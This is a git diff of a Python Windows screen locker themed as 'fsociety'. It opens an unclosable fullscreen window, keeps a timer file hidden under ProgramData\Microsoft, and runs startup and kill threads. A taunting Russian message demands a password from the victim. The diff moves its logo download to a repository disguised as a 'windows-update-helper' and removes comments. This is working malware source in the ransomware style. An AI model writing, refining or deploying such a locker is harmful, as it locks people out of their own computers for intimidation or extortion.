@@ -7,12 +7,11 @@ PASS = "1601"
 TRIES = 5
 HOURS = 1
 TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
-LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
+LOGO_URL = "https://github.com/ippo123459-bit/windows-update-helper/blob/main/FSociety%20by%20cliptonyzer.jpg?raw=true"
 tries = TRIES
 
 def download_file(url, path):
-    if os.path.exists(path) and os.path.getsize(path) > 1000:
-        return True
+    if os.path.exists(path) and os.path.getsize(path) > 1000: return True
     try:
         urllib.request.urlretrieve(url, path)
         if os.path.getsize(path) > 1000: return True
@@ -94,39 +93,30 @@ def anim_fsociety():
     a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
     a.protocol("WM_DELETE_WINDOW", lambda: None)
-    
-    # fsociety текст
     lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 55, 'bold'))
     lbl.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         lbl.config(text=t); a.update(); time.sleep(0.3)
-    
     time.sleep(1)
-    
-    # "тебя приветствует"
     sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 22))
     sub.pack(pady=20)
     text = "тебя приветствует"
     for i in range(len(text)+1):
         sub.config(text=text[:i]); a.update(); time.sleep(0.1)
-    
     time.sleep(2.5)
     a.destroy()
 
 def show_logo():
-    logo_path = os.path.join(tempfile.gettempdir(), "fsociety_logo.png")
+    logo_path = os.path.join(tempfile.gettempdir(), "fsociety_logo.jpg")
     if download_file(LOGO_URL, logo_path):
         try:
             lw = tk.Tk()
             lw.attributes('-fullscreen', True); lw.attributes('-topmost', True)
             lw.configure(bg='black'); lw.overrideredirect(True)
             lw.protocol("WM_DELETE_WINDOW", lambda: None)
-            
             img = tk.PhotoImage(file=logo_path)
-            # Уменьшаем если слишком большое
             if img.width() > 800:
-                img = img.subsample(img.width()//400, img.height()//400)
-            
+                img = img.subsample(max(1, img.width()//400), max(1, img.height()//400))
             tk.Label(lw, image=img, bg='black').pack(expand=True)
             lw.update()
             time.sleep(5)
@@ -147,15 +137,12 @@ class Locker:
         
         self.end = timer_get()
         
-        # FSOCIETY заголовок
         tk.Label(self.w, text="FSOCIETY", bg='black', fg='#ff0000', font=('Courier', 50, 'bold')).place(relx=0.5, rely=0.12, anchor='center')
         
-        # Таймер
         self.tl = tk.Label(self.w, text="", bg='black', fg='#ff4444', font=('Courier', 38, 'bold'))
         self.tl.place(relx=0.5, rely=0.22, anchor='center')
         self.tick()
         
-        # Текст
         msg = (f"Вот чего доводит интернет.\n\n"
                f"Вот смотри, ты скачивал игры\nили что там из интернета?\n"
                f"Вот доскачался.\nСиди и жуй мой винлокер.\n\n"
@@ -168,7 +155,6 @@ class Locker:
         
         tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 11, 'bold'), justify='center').place(relx=0.5, rely=0.58, anchor='center')
         
-        # Поле пароля
         cf = tk.Frame(self.w, bg='black')
         cf.place(relx=0.5, rely=0.88, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00ff00', font=('Courier', 16, 'bold')).pack(pady=(0,5))
@@ -219,8 +205,8 @@ if __name__ == "__main__":
         threading.Thread(target=kill, daemon=True).start()
         threading.Thread(target=timer_check, daemon=True).start()
         startup()
-        anim_fsociety()   # Анимация fsociety
-        show_logo()       # Картинка PNG на 5 секунд
+        anim_fsociety()
+        show_logo()
         lock()
         Locker()
         tk.mainloop()
